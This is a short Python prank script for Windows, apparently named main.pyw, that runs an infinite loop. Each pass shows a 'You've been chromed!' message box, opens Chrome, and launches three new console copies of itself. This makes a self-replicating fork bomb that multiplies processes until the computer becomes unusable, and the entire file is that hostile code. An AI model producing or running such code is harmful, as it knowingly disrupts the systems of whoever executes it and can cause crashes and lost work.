import os
import subprocess
import ctypes


def main():

    message_box = ctypes.windll.user32.MessageBoxW

    def open1():
        while True:
            message_box(None, 'You\'ve been chromed!', 'trollage', 0)
            os.system('start chrome')
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)

    open1()


if __name__ == '__main__':
    main()
